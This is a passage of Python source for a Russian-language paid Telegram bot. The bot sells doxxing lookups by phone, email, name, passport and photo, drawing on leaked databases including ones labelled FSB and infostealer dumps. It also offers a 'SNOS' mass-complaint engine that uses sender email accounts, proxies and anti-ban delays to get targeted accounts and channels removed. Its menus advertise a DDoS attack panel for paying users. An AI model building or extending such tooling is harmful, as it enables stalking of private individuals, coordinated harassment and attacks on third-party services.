                "📊 <b>SNOS WEB статистика</b>\n"
                f"Support ✅ {s.get('support_sent', 0)} | ❌ {s.get('support_failed', 0)}\n"
                f"Deactivate ✅ {s.get('deactivate_sent', 0)} | ❌ {s.get('deactivate_failed', 0)}\n"
                f"💀 Мёртвых прокси: {len(s.get('dead_proxies', []))}",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=snos_web_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_account":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        try:
            bot.edit_message_text("👤 <b>Жалоба на аккаунт</b>\nВыберите причину:",
                                  cid, call.message.message_id, parse_mode="HTML",
                                  reply_markup=snos_account_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_channel":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        try:
            bot.edit_message_text("📢 <b>Жалоба на канал</b>\nВыберите причину:",
                                  cid, call.message.message_id, parse_mode="HTML",
                                  reply_markup=snos_channel_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_bot":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        msg = bot.send_message(cid, "Введите username бота (без @):")
        bot.register_next_step_handler(msg, snos_step_bot_username)
        bot.answer_callback_query(call.id); return

    if call.data.startswith("snos_acc:"):
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        template_key = call.data.split(":", 1)[1]
        if template_key not in SNOS_TEMPLATES.get("account", {}):
            bot.answer_callback_query(call.id, "Неизвестный шаблон", show_alert=True); return
        msg = bot.send_message(cid, "Введите username аккаунта (без @):")
        bot.register_next_step_handler(msg, snos_step_account_username, template_key)
        bot.answer_callback_query(call.id); return

    if call.data.startswith("snos_ch:"):
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        template_key = call.data.split(":", 1)[1]
        if template_key not in SNOS_TEMPLATES.get("channel", {}):
            bot.answer_callback_query(call.id, "Неизвестный шаблон", show_alert=True); return
        msg = bot.send_message(cid, "Введите ссылку на канал:")
        bot.register_next_step_handler(msg, snos_step_channel_link, template_key)
        bot.answer_callback_query(call.id); return

    if call.data == "snos_settings":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        try:
            bot.edit_message_text(
                "⚙️ <b>Настройки SNOS (почта)</b>\n"
                f"Отправителей: {len(SNOS_SENDERS)}\n"
                f"Получателей: {len(SNOS_RECEIVERS)}\n"
                f"Anti-ban: {SNOS_DELAY_MIN}–{SNOS_DELAY_MAX}с, "
                f"лимит {SNOS_MAX_PER_SENDER}/отправитель",
                cid, call.message.message_id, parse_mode="HTML",
                reply_markup=snos_settings_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_add_sender":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        msg = bot.send_message(cid, "Введите в формате <code>email:пароль</code>:",
                               parse_mode="HTML")
        bot.register_next_step_handler(msg, snos_step_add_sender)
        bot.answer_callback_query(call.id); return

    if call.data == "snos_add_receiver":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        msg = bot.send_message(cid, "Введите email получателя:")
        bot.register_next_step_handler(msg, snos_step_add_receiver)
        bot.answer_callback_query(call.id); return

    if call.data == "snos_list_senders":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        text = ("📋 Отправителей нет." if not SNOS_SENDERS
                else "📋 <b>Отправители:</b>\n" +
                     "\n".join(f"• <code>{e}</code> (пароль скрыт)" for e in SNOS_SENDERS))
        try:
            bot.edit_message_text(text, cid, call.message.message_id, parse_mode="HTML",
                                  reply_markup=snos_settings_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_list_receivers":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        text = ("📋 Получателей нет." if not SNOS_RECEIVERS
                else "📋 <b>Получатели:</b>\n" +
                     "\n".join(f"• <code>{e}</code>" for e in SNOS_RECEIVERS))
        try:
            bot.edit_message_text(text, cid, call.message.message_id, parse_mode="HTML",
                                  reply_markup=snos_settings_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_send":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        data = last_reports.get(f"snos_{cid}")
        if not data:
            bot.answer_callback_query(call.id, "Заявка не найдена", show_alert=True); return
        bot.answer_callback_query(call.id, "Запускаю рассылку...")
        try:
            bot.edit_message_text(
                "🚀 <b>SNOS запущен в фоне</b>\n"
                "Отчёт придёт отдельным сообщением по завершении.",
                cid, call.message.message_id, parse_mode="HTML")
        except Exception:
            pass
        snos_enqueue(cid, uid, data["subject"], data["body"], data.get("label", "SNOS"))
        last_reports.pop(f"snos_{cid}", None)
        return

    if not is_admin(call.from_user):
        action_names = {
            "menu_phone": "открыл раздел «По номеру»",
            "menu_email": "открыл раздел «По Email»",
            "menu_ip": "открыл раздел «По IP»",
            "menu_name": "открыл раздел «По ФИО»",
            "menu_site": "открыл раздел «По сайту»",
            "menu_kadastr": "открыл раздел «По кадастру»",
            "menu_coords": "открыл раздел «По координатам»",
            "menu_tg": "открыл Telegram OSINT",
            "menu_passport": "открыл раздел «По паспорту»",
            "menu_ok": "открыл раздел «Одноклассники»",
            "menu_photo": "открыл раздел «По фото»",
            "menu_sherlock": "открыл Sherlock",
            "menu_vk": "открыл VK по ссылке",
            "menu_db": "открыл раздел «Локальные БД»",
            "menu_monitor": "открыл мониторинг",
            "menu_help": "открыл помощь",
            "menu_about": "открыл «О нас»",
            "monitor_add": "добавляет сайт в мониторинг",
            "monitor_list": "смотрит список мониторинга",
            "save_pdf": "сохранил отчёт в PDF",
            "save_xml": "сохранил отчёт в XML",
            "snos_menu": "открыл SNOS",
            "ddos_menu": "открыл DDoS",
        }
        if call.data in action_names:
            register_user(call.from_user, action_names[call.data])

    if call.data == "menu_main":
        bot.edit_message_text("👋 <b>OSINT-бот</b>\n\nВыберите действие:",
                              cid, call.message.message_id, parse_mode="HTML",
                              reply_markup=main_menu(call.from_user))
    elif call.data == "menu_phone":
        bot.edit_message_text(
            "📞 Отправьте номер:\n<code>/phone +79161234567</code>\n\n"
            "Бот проверит более 200 источников, включая:\n"
            "• phonenumbers / HTMLWEB / Veriphone\n"
            "• Numverify / AbstractAPI / IPQS / Eyecon / Sync.me / Truecaller\n"
            "• Telegram / WhatsApp / Viber live\n"
            "• MNP / HLR / Twilio / Vonage / Telesign\n"
            "• Numlookupapi / Melissa / Whitepages\n"
            "• Zaba / Callapp / Hiya / Mr.Number / ShouldIAnswer\n"
            "• Tellows / KtoZvonil / Zvonili / GetIPIntel\n"
            "• Spokeo / BeenVerified / Radaris / Intelius / TruthFinder\n"
            "• FastPeopleSearch / TruePeopleSearch / PeopleFinders / MyLife\n"
            "• HIBP / XposedOrNot / DeHashed / Intelligence X\n"
            "• Facebook/Instagram/LinkedIn/Snapchat/TikTok/Twitter live\n"
            "• Apify People Search / GetContact CLI / NeutrinoAPI\n"
            "• Apify TruePeopleSearch / Apify Phone Enrichment\n"
            "• NumLookupAPI (новый) / That'sThem (US)\n"
            "• Telnyx / SignalWire / Bandwidth / Plivo / Commio\n"
            "• Interbase / Getcontact / ФСБ / God_eye / Telegram\n"
            "• Сбер/Тинькофф/ВТБ/Альфа + все банки и мобильные операторы\n"
            "• ГИБДД/ФНС/ПФР/МВД/ФССП/Росреестр + ОМС/образование/военкомат\n"
            "• Avito/WB/Ozon/Я.Еда\n"
            "• VK/OK/Mail.ru/Yandex/Gmail + все архивы\n"
            "• TikTok/Instagram/Facebook/Twitter/LinkedIn/Snapchat/Reddit\n"
            "• Telegram/WhatsApp/Viber/Signal/Discord/Steam/Twitch\n"
            "• Spotify/Netflix/Tinder/Badoo/Pinterest/Tumblr\n"
            "• YandexMusic/VKMusic\n"
            "• Facebook Email + утечки + инфостилеры\n"
            "• Глубокое досье с оценкой 0–400\n"
            "• 📸 Фото здания по координатам (если есть)",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_email":
        bot.edit_message_text(
            "📧 <b>Расширенный поиск по Email</b>\n\n"
            "Отправьте email:\n<code>/email test@example.com</code>\n\n"
            "Бот проверит:\n"
            "• SMTP-валидацию\n• MX-записи\n• Одноразовый ли email\n"
            "• WHOIS домена\n• Gravatar\n• GitHub\n"
            "• Утечки (XposedOrNot, HIBP, LeakCheck)\n"
            "• Публичные пасты\n• Регистрации (holehe)\n"
            "• Facebook Email базы\n• Apify TruePeopleSearch (по email)",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_ip":
        bot.edit_message_text(
            "🌐 Отправьте IP двумя способами:\n"
            "<code>/ip 8.8.8.8</code> — обычный + 📸 фото здания\n"
            "<code>/ipx 8.8.8.8</code> — расширенный + 📸 фото здания",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_name":
        bot.edit_message_text(
            "👤 Отправьте ФИО:\n<code>/name Иван Иванов</code>\n\n"
            "Поиск в базе ФСБ, God_eye, Telegram, Facebook Email "
            "и Apify TruePeopleSearch + ссылки на соцсети.",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_site":
        bot.edit_message_text("🌍 Отправьте домен:\n<code>/site example.com</code>",
                              cid, call.message.message_id, parse_mode="HTML",
                              reply_markup=back_menu())
    elif call.data == "menu_kadastr":
        bot.edit_message_text(
            "🏠 Отправьте адрес командой:\n"
            "<code>/kadastr Москва, ул. Тверская, д. 1</code>\n\n"
            "Бот сформирует ссылки на официальные сервисы Росреестра.",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_coords":
        bot.edit_message_text(
            "📍 Отправьте координаты:\n<code>/coords 55.7558,37.6173</code>\n\n"
            "Бот покажет адрес + 📸 фото здания.",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_tg":
        bot.edit_message_text(
            "📱 Отправьте username:\n<code>/tg username</code>\n\n"
            "Также доступно:\n<code>/tgid 1646744189</code>",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_passport":
        bot.edit_message_text(
            "🆔 Отправьте номер паспорта (10 цифр):\n"
            "<code>/passport 1234567890</code>",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_ok":
        bot.edit_message_text(
            "👥 Проверка привязки номера к Одноклассникам:\n"
            "<code>/ok +79161234567</code>",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_photo":
        bot.edit_message_text(
            "🖼️ <b>Поиск по фото</b>\n\n"
            "Просто отправьте боту фотографию (или изображение файлом).\n\n"
            "Бот проверит:\n• Google Lens\n• Яндекс.Картинки\n• EXIF\n"
            "• Ссылки на ручные сервисы",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_db":
        bot.edit_message_text(
            "🗄️ Отправьте номер:\n<code>/db +79161234567</code>\n\n"
            "Поиск по локальным базам Interbase, Getcontact, ФСБ, God_eye, Telegram "
            "и всем прочим загруженным базам.",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_monitor":
        bot.edit_message_text("📡 <b>Uptime-мониторинг</b>", cid, call.message.message_id,
                              parse_mode="HTML", reply_markup=monitor_menu())
    elif call.data == "menu_help":
        bot.edit_message_text(
            "ℹ️ <b>Команды:</b>\n"
            "/phone +79161234567\n/email test@example.com\n/ip 8.8.8.8\n"
            "/ipx 8.8.8.8\n/name Иван Иванов\n/site example.com\n"
            "/kadastr Москва, ул. Тверская, д. 1\n/coords 55.7558,37.6173\n"
            "/tg username\n/tgid 1646744189\n/passport 1234567890\n/ok +79161234567\n"
            "/nick username (Sherlock)\n/vk https://vk.com/username\n"
            "/tps телефон_имя_email (TruePeopleSearch, US)\n"
            "/db +79161234567\n/monitor\n/region RU\n/about\n/vip\n"
            "/ddos (VIP)\n/ddos_stats (админ)\n"
            "/broadcast Текст (владелец)\n"
            "/snos_check (админ)\n/snos_stats (админ)\n"
            "/snos_web_count N (админ, 1..1000)\n"
            "/maintenance (админ)\n\n"
            "🖼️ Просто отправьте фото.\n"
            "📨 SNOS — жалобы (WEB + почта).\n"
            "💣 DDoS — панель атак (VIP).\n"
            "🎁 Первый пробив — бесплатно (1 раз).\n"
            "💎 Оплата VIP: рубли (ЮMoney), NFT на @lonazov или крипта (TON) "
            "на UQA6php32B3jtOuy-hNFDktjeA-Tkpb4d2T95jzDZMlV5Tah + обязательный скриншот.\n"
            "📸 Фото здания при /ip, /ipx, /coords (Google Street View / Yandex).",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "menu_about":
        bot.edit_message_text(ABOUT_TEXT, cid, call.message.message_id,
                              parse_mode="HTML", reply_markup=back_menu())
    elif call.data == "monitor_add":
        msg = bot.send_message(cid, "Введите домен для мониторинга:")
        bot.register_next_step_handler(msg, process_monitor_add)
    elif call.data == "monitor_list":
        show_monitor_list(cid)
    elif call.data == "save_pdf":
        report = last_reports.get(cid)
        if report:
            bot.answer_callback_query(call.id, "Готовлю PDF...")
            send_report(cid, report, "pdf")
        else:
            bot.answer_callback_query(call.id, "Нет отчёта", show_alert=True)
    elif call.data == "save_xml":
        report = last_reports.get(cid)
        if report:
            bot.answer_callback_query(call.id, "Готовлю XML...")
            send_report(cid, report, "xml")
        else:
            bot.answer_callback_query(call.id, "Нет отчёта", show_alert=True)

    if call.data not in ("save_pdf", "save_xml", "monitor_add", "admin_panel",
                         "admin_block", "admin_unblock", "admin_list",
                         "admin_users", "admin_stats", "admin_reloaddb",
                         "maintenance_on", "maintenance_off",
                         "vip_menu", "vip_buy", "vip_status", "vip_rules",
                         "vip_admin", "vip_grant", "vip_revoke", "vip_list",
                         "vip_orders", "vip_edit_pay", "vip_edit_nft", "vip_edit_crypto",
                         "snos_menu", "snos_mail_menu", "snos_account", "snos_channel",
                         "snos_bot", "snos_settings", "snos_add_sender",
                         "snos_add_receiver", "snos_list_senders",
                         "snos_list_receivers", "snos_send",
                         "snos_web_menu", "snos_web_support_form",
                         "snos_web_deact_form", "snos_web_settings",
                         "snos_web_stats", "owner_broadcast",
                         "menu_sherlock", "menu_vk",
                         "ddos_menu", "ddos_start", "ddos_stats_view",
                         "ddos_settings"):
        if not call.data.startswith(("vip_buy:", "vip_pay_rub:", "vip_pay_nft:",
                                     "vip_pay_crypto:", "vip_proof:", "vip_order_ok:",
                                     "vip_order_no:", "snos_acc:", "snos_ch:", "ddos_m:")):
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass


def process_admin_block(message):
    if not is_admin(message.from_user): return
    try:
        uid = int(message.text.strip())
    except ValueError:
        bot.reply_to(message, "❌ ID должен быть числом."); return
    blocked_users.add(uid); save_blocked()
    bot.reply_to(message, f"🚫 Пользователь <code>{uid}</code> заблокирован.", parse_mode="HTML")
    try: bot.send_message(uid, "🚫 Доступ к боту запрещён администратором.")
    except Exception: pass


def process_admin_unblock(message):
    if not is_admin(message.from_user): return
    try:
        uid = int(message.text.strip())
    except ValueError:
        bot.reply_to(message, "❌ ID должен быть числом."); return
    blocked_users.discard(uid); save_blocked()
    bot.reply_to(message, f"✅ Пользователь <code>{uid}</code> разблокирован.", parse_mode="HTML")
    try: bot.send_message(uid, "✅ Доступ к боту восстановлен.")
    except Exception: pass


def process_monitor_add(message):
    domain = message.text.strip().lower()
    domain = re.sub(r"^https?://", "", domain).split("/")[0]
    if "." not in domain or len(domain) < 4:
        bot.reply_to(message, "❌ Некорректный домен."); return
    register_user(message.from_user, f"добавил сайт в мониторинг: {domain}")
    with monitor_lock:
        monitored_sites.setdefault(message.chat.id, {})
        if domain in monitored_sites[message.chat.id]:
            bot.reply_to(message, f"⚠️ {domain} уже в списке."); return
        monitored_sites[message.chat.id][domain] = {
            "status": "up", "last_check": time.time(),
            "interval": 300, "fail_count": 0}
    save_monitored()
    bot.reply_to(message, f"✅ <b>{domain}</b> добавлен в мониторинг.", parse_mode="HTML")


def show_monitor_list(chat_id):
    with monitor_lock:
        sites = monitored_sites.get(chat_id, {})
        if not sites:
            bot.send_message(chat_id, "📋 Список пуст.", reply_markup=monitor_menu()); return
        lines = ["📋 <b>Ваши сайты:</b>\n"]
        for domain, info in sites.items():
            emoji = "🟢" if info["status"] == "up" else "🔴"
            lines.append(f"{emoji} {domain}")
    kb = types.InlineKeyboardMarkup(row_width=1)
    for domain in sites.keys():
        kb.add(types.InlineKeyboardButton(f"🟦 ❌ Удалить {domain}",
                                          callback_data=f"monitor_del:{domain}"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML", reply_markup=kb)


@bot.callback_query_handler(func=lambda call: call.data.startswith("monitor_del:"))
def handle_monitor_del(call):
    if is_blocked(call.from_user.id):
        bot.answer_callback_query(call.id, "🚫 Доступ запрещён", show_alert=True); return
    if is_maintenance() and not is_admin(call.from_user):
        bot.answer_callback_query(call.id, "⚠️ Бот на техническом перерыве", show_alert=True); return
    domain = call.data.split(":", 1)[1]
    with monitor_lock:
        if call.message.chat.id in monitored_sites and domain in monitored_sites[call.message.chat.id]:
            del monitored_sites[call.message.chat.id][domain]
    save_monitored()
    register_user(call.from_user, f"удалил сайт из мониторинга: {domain}")
    bot.answer_callback_query(call.id, f"{domain} удалён")
    bot.edit_message_text(f"❌ {domain} удалён из мониторинга.",
                          call.message.chat.id, call.message.message_id,
                          reply_markup=monitor_menu())


# ================== ТЕКСТ ==================
@bot.message_handler(content_types=["text"])
def handle_text(message):
    if not check_access(message, require_vip=False):
        return
    text = message.text.strip()
    if text.startswith("/"):
        bot.reply_to(message, "Неизвестная команда. Смотрите /help"); return
    if not has_vip(message.from_user) and not is_admin(message.from_user):
        if not (has_free_lookup(message.from_user) and consume_free_lookup(message.from_user)):
            show_vip_wall(message.chat.id, message.from_user); return
        bot.send_message(
            message.chat.id,
            "🎁 <b>Бесплатный пробный пробив активирован!</b>\nОсталась 1 попытка.",
            parse_mode="HTML",
        )
    if "@" in text and "." in text.split("@")[-1] and " " not in text:
        register_user(message.from_user, f"поиск по email: {text}")
        bot.send_chat_action(message.chat.id, "typing")
        result_text, report = lookup_email(text)
        if report: last_reports[message.chat.id] = report
        bot.reply_to(message, result_text, parse_mode="HTML",
                     disable_web_page_preview=True,
                     reply_markup=result_menu(has_report=report is not None)); return
    try:
        ipaddress.ip_address(text)
        register_user(message.from_user, f"поиск по IP: {text}")
        bot.send_chat_action(message.chat.id, "typing")
        result_text, report = lookup_ip(text, chat_id=message.chat.id)
        if report: last_reports[message.chat.id] = report
        bot.reply_to(message, result_text, parse_mode="HTML",
                     disable_web_page_preview=True,
                     reply_markup=result_menu(has_report=report is not None)); return
    except ValueError:
        pass
    if re.match(r"^[a-z0-9\-]+\.[a-z]{2,}$", text.lower()) and " " not in text:
        register_user(message.from_user, f"поиск по сайту: {text}")
        bot.send_chat_action(message.chat.id, "typing")
        result_text, report = lookup_site(text)
        if report: last_reports[message.chat.id] = report
        bot.reply_to(message, result_text, parse_mode="HTML",
                     disable_web_page_preview=True,
                     reply_markup=result_menu(has_report=report is not None)); return
    if re.match(r"^-?\d+(\.\d+)?\s*,\s*-?\d+(\.\d+)?$", text):
        register_user(message.from_user, f"поиск по координатам: {text}")
        bot.send_chat_action(message.chat.id, "typing")
        result_text, report = lookup_coords(text, chat_id=message.chat.id)
        if report: last_reports[message.chat.id] = report
        bot.reply_to(message, result_text, parse_mode="HTML",
                     disable_web_page_preview=True,
                     reply_markup=result_menu(has_report=report is not None)); return
    region = user_regions.get(message.chat.id, "RU")
    try:
        parsed = phonenumbers.parse(text, region)
        if phonenumbers.is_valid_number(parsed):
            register_user(message.from_user, f"поиск по номеру: {text}")
            bot.send_chat_action(message.chat.id, "typing")
            result_text, report = lookup_phone(text, region)
            if report: last_reports[message.chat.id] = report
            bot.reply_to(message, result_text, parse_mode="HTML",
                         reply_markup=result_menu(has_report=report is not None)); return
    except Exception:
        pass
    register_user(message.from_user, f"неизвестный запрос: {text[:50]}")
    bot.reply_to(
        message,
        "Не понял запрос.\n📞 +79161234567\n📧 /email test@example.com\n🌐 /ip 8.8.8.8\n"
        "🌐 /ipx 8.8.8.8\n🌍 /site example.com\n"
        "🏠 /kadastr Москва, ул. Тверская, д. 1\n"
        "📍 /coords 55.7558,37.6173\n📱 /tg username\n🆔 /tgid 1646744189\n"
        "🆔 /passport 1234567890\n👥 /ok +79161234567\n"
        "🕵️ /nick username\n🔗 /vk https://vk.com/username\n"
        "🆔 /tps имя_телефон_email\n"
        "🖼️ Отправьте фото для поиска\n"
        "🗄️ /db +79161234567\n📡 /monitor\n👤 /name Иван Иванов\n"
        "💣 /ddos (VIP)\n📨 /vip → SNOS\n💎 /vip\n👑 /about",
        reply_markup=back_menu())


# ================== ЗАПУСК ==================
def run_bot():
    log("Загрузка баз данных с GitHub...")
    load_dynamic_databases()
    ensure_owner_vip()
    if is_maintenance():
        log("⚠️ ВНИМАНИЕ: бот запущен в режиме ТЕХНИЧЕСКОГО ПЕРЕРЫВА")
    log("Бот запущен, начинаю polling...")
    while True:
        try:
            bot.infinity_polling(
                timeout=30,
                long_polling_timeout=30,
                none_stop=True,
                skip_pending=True,
                logger_level=0,
            )
        except KeyboardInterrupt:
            log("Получен Ctrl+C, останавливаю бота.")
            break
        except Exception as e:
            log(f"❌ Ошибка polling: {e}. Переподключение через 10 секунд...")
            time.sleep(10)
            continue
        log("⚠️ polling завершился, перезапуск через 5 секунд...")
        time.sleep(5)


if __name__ == "__main__":
    start_monitor()
    run_bot()